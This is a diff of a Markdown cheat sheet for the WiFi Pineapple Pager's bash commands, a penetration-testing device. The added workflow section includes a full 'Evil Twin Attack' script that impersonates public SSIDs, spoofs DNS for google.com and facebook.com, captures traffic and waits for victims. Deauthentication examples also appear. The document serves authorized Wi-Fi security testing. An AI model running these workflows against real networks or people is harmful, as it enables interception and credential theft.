-#### `PINEAPPLE_SSID_POOL_STOP`
-Stop advertising the SSID pool.
+<details>
+<summary><b>⏸️ PINEAPPLE_SSID_POOL_STOP - Stop advertising</b></summary>
 
+**Syntax:**
 ```bash
 PINEAPPLE_SSID_POOL_STOP
 ```
 
----
+</details>
 
-#### `PINEAPPLE_SSID_POOL_COLLECT_START`
-Start collecting probe requests into the SSID impersonation pool.
+<details>
+<summary><b>📋 PINEAPPLE_SSID_POOL_LIST - List SSIDs</b></summary>
 
+**Syntax:**
+```bash
+PINEAPPLE_SSID_POOL_LIST
+```
+
+</details>
+
+<details>
+<summary><b>🗑️ PINEAPPLE_SSID_POOL_DELETE - Remove SSID</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_SSID_POOL_DELETE [ssid]
+```
+
+</details>
+
+<details>
+<summary><b>🧹 PINEAPPLE_SSID_POOL_CLEAR - Clear all SSIDs</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_SSID_POOL_CLEAR
+```
+
+</details>
+
+<details>
+<summary><b>📡 PINEAPPLE_SSID_POOL_COLLECT_START - Collect probe requests</b></summary>
+
+**Syntax:**
 ```bash
 PINEAPPLE_SSID_POOL_COLLECT_START
 ```
 
----
+**Use Case:** Automatically collect SSIDs from probe requests
 
-#### `PINEAPPLE_SSID_POOL_COLLECT_STOP`
-Stop collecting probe requests into the SSID impersonation pool.
-
-```bash
-PINEAPPLE_SSID_POOL_COLLECT_STOP
-```
-
----
-
-### SSID Filtering
-
-#### `PINEAPPLE_SSID_FILTER_ADD`
-Add a SSID to a filter.
-
-```bash
-PINEAPPLE_SSID_FILTER_ADD [allow|deny] [ssid]
-```
-
-**Parameters:**
-- `allow` - Add a SSID to the allow list. In allow mode, the Pineapple only accepts connections to a SSID in the allow list.
-- `deny` - Add a SSID to the deny list. In deny mode, any SSID NOT in the deny list is allowed.
-
----
-
-#### `PINEAPPLE_SSID_FILTER_DELETE`
-Remove a SSID from a filter.
-
-```bash
-PINEAPPLE_SSID_FILTER_DELETE [allow|deny] [ssid]
-```
-
----
-
-#### `PINEAPPLE_SSID_FILTER_LIST`
-List SSID filters.
-
-```bash
-PINEAPPLE_SSID_FILTER_LIST [allow|deny]
-```
-
----
-
-#### `PINEAPPLE_SSID_FILTER_CLEAR`
-Clear a SSID filter.
-
-```bash
-PINEAPPLE_SSID_FILTER_CLEAR [allow|deny]
-```
-
----
-
-#### `PINEAPPLE_SSID_FILTER_MODE`
-Set SSID filter mode.
-
-```bash
-PINEAPPLE_SSID_FILTER_MODE [allow|deny]
-```
-
-**Parameters:**
-- `allow` - Only allow SSIDs listed in the SSID filter allow list to connect
-- `deny` - Allow any SSIDs NOT LISTED in the SSID filter deny list to connect
-
----
+</details>
 
 ### MAC Filtering
 
-#### `PINEAPPLE_MAC_FILTER_ADD`
-Add a MAC address to a filter.
+<details>
+<summary><b>🔐 PINEAPPLE_MAC_FILTER_MODE - Set filter mode</b></summary>
 
-```bash
-PINEAPPLE_MAC_FILTER_ADD [allow|deny] [mac]
-```
-
-**Parameters:**
-- `allow` - Add a MAC to the allow list. In allow mode, only devices in the allowed list can connect
-- `deny` - Add a MAC to the deny list. In deny mode, any device NOT in the deny list can connect
-- `mac` - MAC address to add
-
----
-
-#### `PINEAPPLE_MAC_FILTER_DELETE`
-Remove a MAC address from a filter.
-
-```bash
-PINEAPPLE_MAC_FILTER_DELETE [allow|deny] [mac]
-```
-
----
-
-#### `PINEAPPLE_MAC_FILTER_LIST`
-List MAC filters.
-
-```bash
-PINEAPPLE_MAC_FILTER_LIST [allow|deny]
-```
-
----
-
-#### `PINEAPPLE_MAC_FILTER_CLEAR`
-Clear a MAC filter.
-
-```bash
-PINEAPPLE_MAC_FILTER_CLEAR [allow|deny]
-```
-
-**Parameters:**
-- `allow` - Clear the allow filter list (no devices will be able to connect)
-- `deny` - Clear the deny filter list (any device will be able to connect)
-
----
-
-#### `PINEAPPLE_MAC_FILTER_MODE`
-Set MAC filter mode.
-
+**Syntax:**
 ```bash
 PINEAPPLE_MAC_FILTER_MODE [allow|deny]
 ```
 
-**Parameters:**
-- `allow` - Only allow devices listed in the MAC filter allow list to connect
-- `deny` - Allow any device NOT LISTED in the MAC filter deny list to connect
+**Modes:**
+- `allow` - Only listed MACs can connect
+- `deny` - Listed MACs cannot connect
 
----
+**Example:**
+```bash
+PINEAPPLE_MAC_FILTER_MODE allow
+PINEAPPLE_MAC_FILTER_ADD allow "aa:bb:cc:dd:ee:ff"
+```
+
+</details>
+
+<details>
+<summary><b>➕ PINEAPPLE_MAC_FILTER_ADD - Add MAC to filter</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_MAC_FILTER_ADD [allow|deny] [mac]
+```
+
+</details>
+
+<details>
+<summary><b>➖ PINEAPPLE_MAC_FILTER_DELETE - Remove MAC</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_MAC_FILTER_DELETE [allow|deny] [mac]
+```
+
+</details>
+
+<details>
+<summary><b>📋 PINEAPPLE_MAC_FILTER_LIST - List filtered MACs</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_MAC_FILTER_LIST [allow|deny]
+```
+
+</details>
+
+### SSID Filtering
+
+<details>
+<summary><b>🔍 PINEAPPLE_SSID_FILTER_MODE - Set SSID filter mode</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_SSID_FILTER_MODE [allow|deny]
+```
+
+</details>
+
+<details>
+<summary><b>➕ PINEAPPLE_SSID_FILTER_ADD - Add SSID to filter</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_SSID_FILTER_ADD [allow|deny] [ssid]
+```
+
+</details>
 
 ### Channel Operations
 
-#### `PINEAPPLE_EXAMINE_BSSID`
-Lock to the channel of a given BSSID.
+<details>
+<summary><b>📡 PINEAPPLE_EXAMINE_CHANNEL - Lock to channel</b></summary>
 
-```bash
-PINEAPPLE_EXAMINE_BSSID [bssid] {time}
-```
-
-**Parameters:**
-- `bssid` - BSSID
-- `time` - Time (in seconds)
-
----
-
-#### `PINEAPPLE_EXAMINE_CHANNEL`
-Lock to a given channel.
-
+**Syntax:**
 ```bash
 PINEAPPLE_EXAMINE_CHANNEL [channel] {time}
 ```
 
-**Parameters:**
-- `channel` - WiFi channel
-- `time` - Time (in seconds)
+**Example:**
+```bash
+PINEAPPLE_EXAMINE_CHANNEL 6 60  # Lock to channel 6 for 60 seconds
+```
 
----
+</details>
 
-#### `PINEAPPLE_EXAMINE_RESET`
-Stop examining a single channel.
+<details>
+<summary><b>🎯 PINEAPPLE_EXAMINE_BSSID - Lock to BSSID channel</b></summary>
 
+**Syntax:**
+```bash
+PINEAPPLE_EXAMINE_BSSID [bssid] {time}
+```
+
+</details>
+
+<details>
+<summary><b>🔄 PINEAPPLE_EXAMINE_RESET - Reset channel lock</b></summary>
+
+**Syntax:**
 ```bash
 PINEAPPLE_EXAMINE_RESET
 ```
 
----
+</details>
 
-#### `PINEAPPLE_SET_BANDS`
-Set monitoring bands.
+<details>
+<summary><b>📶 PINEAPPLE_SET_BANDS - Set monitoring bands</b></summary>
 
+**Syntax:**
 ```bash
 PINEAPPLE_SET_BANDS [interface] {2} {5} {6}
 ```
 
-**Parameters:**
-- `interface` - WiFi interface (typically `wlan1mon`)
-- `2` - Monitor 2.4GHz channels
-- `5` - Monitor 5GHz channels
-- `6` - Monitor 6GHz channels
-
----
-
-### Reconnaissance
-
-#### `PINEAPPLE_RECON_NEW`
-Start a new PineAP recon session.
-
+**Example:**
 ```bash
-PINEAPPLE_RECON_NEW {name}
+PINEAPPLE_SET_BANDS wlan1mon 2 5  # Monitor 2.4GHz and 5GHz
 ```
 
-**Parameters:**
-- `name` - Recon name (optional)
-
----
+</details>
 
 ### Deauthentication
 
-#### `PINEAPPLE_DEAUTH_CLIENT`
-Use PineAP to attempt to disconnect a Wi-Fi client.
+<details>
+<summary><b>💥 PINEAPPLE_DEAUTH_CLIENT - Disconnect client</b></summary>
 
+**Syntax:**
 ```bash
 PINEAPPLE_DEAUTH_CLIENT [bssid] [target] [channel]
 ```
 
-**Parameters:**
-- `bssid` - BSSID (MAC address of AP) to mimic
-- `target` - MAC address of client device to disconnect
-- `channel` - Channel to send disconnect packets on
+**Example:**
+```bash
+PINEAPPLE_DEAUTH_CLIENT "00:11:22:33:44:55" "aa:bb:cc:dd:ee:ff" 6
+```
+
+</details>
+
+### Reconnaissance
+
+<details>
+<summary><b>🔍 PINEAPPLE_RECON_NEW - Start recon session</b></summary>
+
+**Syntax:**
+```bash
+PINEAPPLE_RECON_NEW {name}
+```
+
+**Example:**
+```bash
+PINEAPPLE_RECON_NEW "CoffeeShop_Recon"
+```
+
+</details>
 
 ---
 
-## Network & VPN
+## 🌐 Network & VPN
 
 ### AutoSSH
 
-#### `AUTOSSH_CONFIGURE`
-Control and configure the AUTOSSH tool.
+<details>
+<summary><b>🔐 AUTOSSH_CONFIGURE - Configure SSH tunnel</b></summary>
 
+**Syntax:**
 ```bash
 AUTOSSH disable
 AUTOSSH enable [host] [port] [user] [remoteport] [localport]
 ```
 
----
-
-#### `AUTOSSH_ADD_PORT`
-Control and configure the AUTOSSH tool port forward.
-
+**Example:**
 ```bash
-AUTOSSH_ADD_PORT local [localport] [host] [remoteport]
-AUTOSSH_ADD_PORT remote [localport] [host] [remoteport]
+AUTOSSH enable example.com 22 root 8080 80
 ```
 
----
+</details>
 
-#### `AUTOSSH_ENABLE`
-Enable the AUTOSSH tool.
+<details>
+<summary><b>▶️ AUTOSSH_ENABLE - Enable SSH tunnel</b></summary>
 
-> AutoSSH must be configured before it can be enabled; this command is only useful for enabling an existing configuration.
-
+**Syntax:**
 ```bash
 AUTOSSH_ENABLE
 ```
 
----
+</details>
 
-#### `AUTOSSH_DISABLE`
-Disable the AUTOSSH tool.
+<details>
+<summary><b>⏹️ AUTOSSH_DISABLE - Disable SSH tunnel</b></summary>
 
+**Syntax:**
 ```bash
 AUTOSSH_DISABLE
 ```
 
----
-
-#### `AUTOSSH_CLEAR`
-Clear the AUTOSSH configuration.
-
-```bash
-AUTOSSH_CLEAR
-```
-
----
+</details>
 
 ### OpenVPN
 
-#### `OPENVPN_CONFIGURE`
-Configure the OpenVPN client.
+<details>
+<summary><b>🔐 OPENVPN_CONFIGURE - Configure OpenVPN</b></summary>
 
+**Syntax:**
 ```bash
 OPENVPN_CONFIGURE disable
 OPENVPN_CONFIGURE enable [config file]
 ```
 
----
-
-#### `OPENVPN_ENABLE`
-Enable the OpenVPN client.
-
-> OpenVPN must be configured before it can be enabled; this command is only useful for enabling an existing configuration.
-
+**Example:**
 ```bash
+OPENVPN_CONFIGURE enable /root/vpn.ovpn
 OPENVPN_ENABLE
 ```
 
----
-
-#### `OPENVPN_DISABLE`
-Disable the OpenVPN client.
-
-```bash
-OPENVPN_DISABLE
-```
-
----
+</details>
 
 ### WireGuard
 
-#### `WIREGUARD_CONFIGURE`
-Configure the Wireguard client.
+<details>
+<summary><b>🔐 WIREGUARD_CONFIGURE - Configure WireGuard</b></summary>
 
-> A Wireguard configuration can be relatively complex and difficult to perform with a single command; this command is primarily intended for use in automated device setup scripts.
-
+**Syntax:**
 ```bash
 WIREGUARD_CONFIGURE disable
 WIREGUARD_CONFIGURE enable [wg.conf]
+# Or with parameters:
 WIREGUARD_CONFIGURE enable [server-ip] [server-port] [server-pubkey] \
   [server-psk | NONE] [private-key | AUTO] [local-ip] \
   [ipv4-networks | NONE] [ipv6-networks | NONE]
 ```
 
----
-
-#### `WIREGUARD_ENABLE`
-Enable the Wireguard client.
-
-> Wireguard must be configured before it can be enabled; this command is only useful for enabling an existing configuration.
-
-```bash
-WIREGUARD_ENABLE
-```
-
----
-
-#### `WIREGUARD_DISABLE`
-Disable the Wireguard client.
-
-```bash
-WIREGUARD_DISABLE
-```
-
----
+</details>
 
 ### DNS Spoofing
 
-#### `DNSSPOOF_ADD_HOST`
-Add a host to the DNS override list.
+<details>
+<summary><b>🌐 DNSSPOOF_ADD_HOST - Add DNS override</b></summary>
 
+**Syntax:**
 ```bash
 DNSSPOOF_ADD_HOST A [hostname] [IPv4 address]
 DNSSPOOF_ADD_HOST AAAA [hostname] [IPv6 address]
@@ -944,55 +1252,27 @@ DNSSPOOF_ADD_HOST AAAA [hostname] [IPv6 address]
 
 **Example:**
 ```bash
-DNSSPOOF_ADD_HOST A "example.com" "192.168.1.100"
+DNSSPOOF_ADD_HOST A "google.com" "192.168.1.100"
+DNSSPOOF_ADD_HOST A "facebook.com" "192.168.1.100"
+DNSSPOOF_ENABLE
 ```
 
----
+</details>
 
-#### `DNSSPOOF_DEL_HOST`
-Remove a host from the DNS override list.
+<details>
+<summary><b>▶️ DNSSPOOF_ENABLE - Enable DNS spoofing</b></summary>
 
-```bash
-DNSSPOOF_DEL_HOST A [hostname] [IPv4 address]
-DNSSPOOF_DEL_HOST AAAA [hostname] [IPv6 address]
-```
-
----
-
-#### `DNSSPOOF_ENABLE`
-Enable the DNS override subsystem.
-
-> DNS overrides must be configured before it can be enabled; this command is only useful for enabling an existing configuration.
-
+**Syntax:**
 ```bash
 DNSSPOOF_ENABLE
 ```
 
----
+</details>
 
-#### `DNSSPOOF_DISABLE`
-Disable the DNS override subsystem.
+<details>
+<summary><b>🌐 SYSTEM_DNS - Set system DNS</b></summary>
 
-```bash
-DNSSPOOF_DISABLE
-```
-
----
-
-#### `DNSSPOOF_CLEAR`
-Clear and disable the DNS override subsystem.
-
-```bash
-DNSSPOOF_CLEAR
-```
-
----
-
-### System DNS
-
-#### `SYSTEM_DNS`
-Control and configure the DNS server used by the system.
-
+**Syntax:**
 ```bash
 SYSTEM_DNS DHCP
 SYSTEM_DNS [IP]
@@ -1001,367 +1281,481 @@ SYSTEM_DNS [IP]
 **Example:**
 ```bash
 SYSTEM_DNS 8.8.8.8
+SYSTEM_DNS 1.1.1.1
 ```
 
----
+</details>
 
-### Client Information
+<details>
+<summary><b>🔍 FIND_CLIENT_IP - Get client IP info</b></summary>
 
-#### `FIND_CLIENT_IP`
-Get information about a connected client device.
-
+**Syntax:**
 ```bash
 FIND_CLIENT_IP [mac] {timeout}
 ```
 
-**Parameters:**
-- `mac` - MAC address of the client, in `aa:bb:cc:dd:ee:ff` form
-- `timeout` - (optional) amount of time to wait for the client to use an IP
+**Example:**
+```bash
+CLIENT_IP=$(FIND_CLIENT_IP "aa:bb:cc:dd:ee:ff" 30)
+echo "Client IP: $CLIENT_IP"
+```
+
+</details>
 
 ---
 
-## GPS Operations
+## 📍 GPS Operations
 
-### GPS Configuration
+<details>
+<summary><b>📍 GPS_CONFIGURE - Setup GPS device</b></summary>
 
-#### `GPS_CONFIGURE`
-Configure an attached GPS.
-
+**Syntax:**
 ```bash
 GPS_CONFIGURE [serial] {speed}
 ```
 
-**Parameters:**
-- `serial` - Serial port (such as `/dev/ttyUSB0`)
-- `speed` - Optional baud rate of serial device
+**Example:**
+```bash
+GPS_CONFIGURE /dev/ttyUSB0 9600
+```
 
-> Most GPS units will operate at a speed of 9600, however some may operate on higher speeds. Consult the documentation for your GPS to find the speed setting required. GPS units can vary widely, make sure to check the Hak5 documentation for information!
+**Common Baud Rates:** 9600 (most common), 4800, 115200
 
----
+</details>
 
-#### `GPS_LIST`
-List available serial GPS devices.
+<details>
+<summary><b>📋 GPS_LIST - List GPS devices</b></summary>
 
+**Syntax:**
 ```bash
 GPS_LIST
 ```
 
----
+</details>
 
-#### `GPS_GET`
-Get the current GPS location.
+<details>
+<summary><b>🌍 GPS_GET - Get current location</b></summary>
 
-Returns the latitude, longitude, altitude, and speed, if known. Requires GPS hardware and a GPS positional lock.
-
+**Syntax:**
 ```bash
 GPS_GET
 ```
 
+**Returns:** Latitude, longitude, altitude, speed
+
+**Example:**
+```bash
+LOCATION=$(GPS_GET)
+LOG "Location: $LOCATION"
+```
+
+</details>
+
 ---
 
-## System Operations
+## ⚙️ System Operations
 
-### Password Management
+<details>
+<summary><b>🔑 PASSWORD - Set admin password</b></summary>
 
-#### `PASSWORD`
-Set the admin/root password of the device.
-
+**Syntax:**
 ```bash
 PASSWORD [password]
 ```
 
----
+**Example:**
+```bash
+PASSWORD "SecurePassword123!"
+```
 
-### Firmware
+</details>
 
-#### `INSTALL_FIRMWARE`
-Validate and install a firmware file.
+<details>
+<summary><b>💾 INSTALL_FIRMWARE - Install firmware</b></summary>
 
+**Syntax:**
 ```bash
 INSTALL_FIRMWARE [file]
 ```
 
----
+</details>
 
-### SSH Configuration
+<details>
+<summary><b>🔐 SSH_ADD_KNOWN_HOST - Add SSH host</b></summary>
 
-#### `SSH_ADD_KNOWN_HOST`
-Add a known host to SSH.
-
-> The ssh-keytool command can be used to collect the remote host fingerprint.
-
+**Syntax:**
 ```bash
 SSH_ADD_KNOWN_HOST [hostname] [keytype] [keydata]
 ```
 
+</details>
+
 ---
 
-## LED & Display
+## 💡 LED & Display
 
-### LED Control
+<details>
+<summary><b>💡 LED - Control LED</b></summary>
 
-#### `LED`
-Configure the LED.
-
+**Syntax:**
 ```bash
 LED [COLOR] [PATTERN]
 LED [STATE]
 ```
 
----
+**Example:**
+```bash
+LED blue solid
+LED red blink
+LED off
+```
 
-### DPAD LED
+</details>
 
-#### `DPADLED`
-Change the DPAD LED color.
+<details>
+<summary><b>🎨 DPADLED - Control DPAD LED</b></summary>
 
+**Syntax:**
 ```bash
 DPADLED [color]
 ```
 
-**Parameters:**
-- `color` - Color of the DPAD LEDs (`red`, `green`, `blue`, `cyan`, `yellow`, `magenta`, `white`, `off`)
+**Colors:** `red`, `green`, `blue`, `cyan`, `yellow`, `magenta`, `white`, `off`
 
----
+**Example:**
+```bash
+DPADLED green
+DPADLED red
+DPADLED off
+```
 
-#### `DPADLED_CONFIG`
-Change the default DPAD LED color.
+</details>
 
+<details>
+<summary><b>⚙️ DPADLED_CONFIG - Set default DPAD LED</b></summary>
+
+**Syntax:**
 ```bash
 DPADLED_CONFIG [color]
 ```
 
----
+</details>
 
-### Display Control
+<details>
+<summary><b>👁️ ENABLE_DISPLAY / DISABLE_DISPLAY</b></summary>
 
-#### `ENABLE_DISPLAY`
-Enable the display.
-
+**Syntax:**
 ```bash
 ENABLE_DISPLAY
-```
-
----
-
-#### `DISABLE_DISPLAY`
-Disable the display.
-
-```bash
 DISABLE_DISPLAY
 ```
 
+</details>
+
 ---
 
-## Logging & Data Collection
+## 📝 Logging & Data Collection
 
-### Logging
+<details>
+<summary><b>📝 LOG - Write to log</b></summary>
 
-#### `LOG`
-Send data to the currently running payload log.
-
+**Syntax:**
 ```bash
 LOG {COLOR} MESSAGE
 ```
 
----
+**Example:**
+```bash
+LOG "Starting attack"
+LOG red "Error occurred"
+```
+
+</details>
 
 ### Wigle Integration
 
-#### `WIGLE_LOGIN`
-Interactively configure Wigle integration.
+<details>
+<summary><b>🔐 WIGLE_LOGIN - Login to Wigle</b></summary>
 
+**Syntax:**
 ```bash
 WIGLE_LOGIN {username} {password}
 ```
 
-**Parameters:**
-- `username` - (optional) username
-- `password` - (optional) password
-
-> If username and password are passed on the command line, `WIGLE_LOGIN` will automatically attempt to retrieve a Wigle API token.
-
----
-
-#### `WIGLE_LOGOUT`
-Remove any Wigle API tokens.
-
+**Example:**
 ```bash
-WIGLE_LOGOUT
+WIGLE_LOGIN "myuser" "mypass"
 ```
 
----
+</details>
 
-#### `WIGLE_START`
-Start a Wigle log (requires a physical GPS).
+<details>
+<summary><b>▶️ WIGLE_START - Start Wigle logging</b></summary>
 
+**Syntax:**
 ```bash
 WIGLE_START
 ```
 
----
+**Requires:** Physical GPS and Wigle login
 
-#### `WIGLE_STOP`
-Stop a Wigle log.
+</details>
 
+<details>
+<summary><b>📤 WIGLE_UPLOAD - Upload to Wigle</b></summary>
+
+**Syntax:**
 ```bash
-WIGLE_STOP
+WIGLE_UPLOAD {--archive} {--remove} [/path/to/file]
 ```
 
----
-
-#### `WIGLE_UPLOAD`
-Upload Wigle log files.
-
-> You must create an account on the Wigle service at https://www.wigle.net and obtain an upload token on this device using the `WIGLE_LOGIN` command. Wigle is not affiliated or associated with Hak5, and uploads to the Wigle service are subject to the Wigle security and privacy policies.
-
+**Example:**
 ```bash
-WIGLE_UPLOAD {--archive} {--remove} [/path/to/file] [path/to/additional/file]
+WIGLE_UPLOAD --archive /root/loot/wigle.log
 ```
 
-**Parameters:**
-- `--archive` - (optional) Move uploaded files to the loot archive in `/root/loot/archive/wigle/`
-- `--remove` - (optional) Remove uploaded files
+</details>
 
 ---
 
-## Payload Configuration
+## 🎯 Payload Configuration
 
-### Configuration Management
+<details>
+<summary><b>💾 PAYLOAD_SET_CONFIG - Store config</b></summary>
 
-#### `PAYLOAD_SET_CONFIG`
-Store a permanent payload configuration option.
-
+**Syntax:**
 ```bash
 PAYLOAD_SET_CONFIG [payload] [option] [value]
 ```
 
-**Parameters:**
-- `payload` - Payload simple name (must not contain spaces, etc)
-- `option` - Option name (must not contain spaces, etc)
-- `value` - Value to store
+**Example:**
+```bash
+PAYLOAD_SET_CONFIG "evil_twin" "ssid" "FreeWiFi"
+PAYLOAD_SET_CONFIG "evil_twin" "timeout" "300"
+```
 
-> Payload names must be simple text names, with no spaces. A payload name should be unique. Option names must be simple text, with no spaces. A value should be quoted if it contains spaces or special characters.
+</details>
 
----
+<details>
+<summary><b>📖 PAYLOAD_GET_CONFIG - Get config</b></summary>
 
-#### `PAYLOAD_GET_CONFIG`
-Retrieve a permanent payload configuration option.
-
+**Syntax:**
 ```bash
 PAYLOAD_GET_CONFIG [payload] [option]
 ```
 
----
+</details>
 
-#### `PAYLOAD_DEL_CONFIG`
-Delete a permanent payload configuration option.
+<details>
+<summary><b>🗑️ PAYLOAD_DEL_CONFIG - Delete config</b></summary>
 
+**Syntax:**
 ```bash
 PAYLOAD_DEL_CONFIG [payload] [option]
 ```
 
+</details>
+
 ---
 
-## USB Operations
+## 💾 USB Operations
 
-### USB Storage
+<details>
+<summary><b>💾 USB_STORAGE - Manage USB storage</b></summary>
 
-#### `USB_STORAGE`
-Manage USB storage.
-
+**Syntax:**
 ```bash
 USB_STORAGE
 ```
 
----
+</details>
 
-#### `USB_WAIT`
-Wait for USB device.
+<details>
+<summary><b>⏱️ USB_WAIT - Wait for USB</b></summary>
 
+**Syntax:**
 ```bash
 USB_WAIT
 ```
 
----
+</details>
 
-#### `USB_FREE`
-Free USB resources.
+<details>
+<summary><b>📤 USB_EJECT - Eject USB device</b></summary>
 
-```bash
-USB_FREE
-```
-
----
-
-#### `USB_EJECT`
-Safely eject a mounted USB device.
-
+**Syntax:**
 ```bash
 USB_EJECT
 ```
 
+</details>
+
 ---
 
-## Developer Functions
+## 💡 Common Workflows
 
-#### `DEVELOPER_THEME_RELOAD`
-Reload theme from disk for currently focused UI element.
+### 🎯 Complete Evil Twin Attack
 
+```bash
+#!/bin/bash
+
+# Accept terms
+SLA_ACCEPT --i-accept
+TOS_ACCEPT --i-accept
+
+# Show startup
+ALERT "Starting Evil Twin Attack"
+LED blue solid
+
+# Collect probe requests
+PINEAPPLE_SSID_POOL_COLLECT_START
+ALERT "Collecting SSIDs from probe requests..."
+sleep 30
+PINEAPPLE_SSID_POOL_COLLECT_STOP
+
+# Add target SSIDs
+PINEAPPLE_SSID_POOL_ADD "FreeWiFi"
+PINEAPPLE_SSID_POOL_ADD "Starbucks_WiFi"
+PINEAPPLE_SSID_POOL_ADD "attwifi"
+
+# Create open AP
+WIFI_OPEN_AP wlan0open "FreeWiFi"
+
+# Start advertising
+PINEAPPLE_SSID_POOL_START
+LED green blink
+
+# Setup DNS spoofing
+DNSSPOOF_ADD_HOST A "google.com" "192.168.1.100"
+DNSSPOOF_ADD_HOST A "facebook.com" "192.168.1.100"
+DNSSPOOF_ENABLE
+
+# Start packet capture
+WIFI_PCAP_START
+
+# Wait for client
+ALERT "Waiting for client connection..."
+FIND_CLIENT_IP "aa:bb:cc:dd:ee:ff" 60
+
+# Notify
+ALERT_RINGTONE true "Client connected!"
+LED red solid
+LOG "Client connected to evil twin"
+
+# Continue monitoring...
+```
+
+### 🌐 VPN Setup Workflow
+
+```bash
+#!/bin/bash
+
+# Connect to WiFi first
+WIFI_CONNECT wlan0cli "MyNetwork" psk2 "password"
+WIFI_WAIT wlan0cli 30
+
+# Configure and enable VPN
+OPENVPN_CONFIGURE enable /root/vpn.ovpn
+OPENVPN_ENABLE
+
+# Or use WireGuard
+# WIREGUARD_CONFIGURE enable /root/wg.conf
+# WIREGUARD_ENABLE
+
+ALERT "VPN Connected"
+```
+
+### 📍 GPS Tracking Workflow
+
+```bash
+#!/bin/bash
+
+# Configure GPS
+GPS_CONFIGURE /dev/ttyUSB0 9600
+
+# Get current location
+LOCATION=$(GPS_GET)
+LOG "Current location: $LOCATION"
+
+# Setup Wigle
+WIGLE_LOGIN "username" "password"
+WIGLE_START
+
+# Log periodically
+while true; do
+    LOCATION=$(GPS_GET)
+    LOG "Location: $LOCATION"
+    sleep 60
+done
+
+# Later: Upload data
+WIGLE_UPLOAD --archive
+```
+
+---
+
+## 🔧 Developer Functions
+
+<details>
+<summary><b>🎨 DEVELOPER_THEME_RELOAD - Reload UI theme</b></summary>
+
+**Syntax:**
 ```bash
 DEVELOPER_THEME_RELOAD {component name}
 ```
 
-> Default component is the current and should be used in most cases. Use the optional component override with caution.
+**Use:** Development and theme testing
+
+</details>
 
 ---
 
-## Special Functions
-
-#### `DO_A_BARREL_ROLL`
-Perform a barrel roll.
-
-```bash
-DO_A_BARREL_ROLL
-```
-
----
-
-## Legal & Terms
+## ⚖️ Legal & Terms
 
 ### Software License Agreement
-
-Before using the device, you must accept the Software License Agreement:
 
 ```bash
 SLA_ACCEPT --i-accept
 ```
 
-The full agreement can be found at: https://hak5.org/products/pineapple/pineapplepager/legal_sla
+**Full Agreement:** https://hak5.org/products/pineapple/pineapplepager/legal_sla
 
 ### Terms of Service
-
-You must also accept the Terms of Service:
 
 ```bash
 TOS_ACCEPT --i-accept
 ```
 
-The full terms can be found at: https://hak5.org/products/pineapple/pineapplepager/legal_tos
+**Full Terms:** https://hak5.org/products/pineapple/pineapplepager/legal_tos
+
+> **⚠️ Important:** Always ensure you have proper authorization before using these tools. Unauthorized access is illegal.
 
 ---
 
 ## 📚 Resources
 
-- [Hak5 Official Website](https://hak5.org)
-- [WiFi Pineapple Pager Documentation](https://docs.hak5.org/pineapple-pager)
-- [Hak5 Forums](https://forums.hak5.org)
+<div align="center">
+
+| Resource | Link |
+|----------|------|
+| 🌐 **Official Website** | [hak5.org](https://hak5.org) |
+| 📖 **Documentation** | [docs.hak5.org/pineapple-pager](https://docs.hak5.org/pineapple-pager) |
+| 💬 **Forums** | [forums.hak5.org](https://forums.hak5.org) |
+| 🛒 **Store** | [shop.hak5.org](https://shop.hak5.org) |
+
+</div>
 
 ---
 
 ## ⚠️ Disclaimer
 
-This cheat sheet is for educational and authorized security testing purposes only. Always ensure you have proper authorization before using these tools. Unauthorized access to computer systems is illegal and unethical.
+<div align="center">
+
+**This cheat sheet is for educational and authorized security testing purposes only.**
+
+Always ensure you have proper authorization before using these tools. Unauthorized access to computer systems is illegal and unethical.
+
+</div>
 
 ---
 
@@ -1373,9 +1767,10 @@ This cheat sheet is provided as-is for educational purposes. Refer to Hak5's off
 
 <div align="center">
 
-**Made with ❤️ for the WiFi Pineapple Pager community**
+### Made with ❤️ for the WiFi Pineapple Pager community
 
-⭐ Star this repo if you find it helpful!
+**⭐ Star this repo if you find it helpful!**
+
+[⬆ Back to Top](#-wifi-pineapple-pager---bash-functions-cheat-sheet)
 
 </div>
-
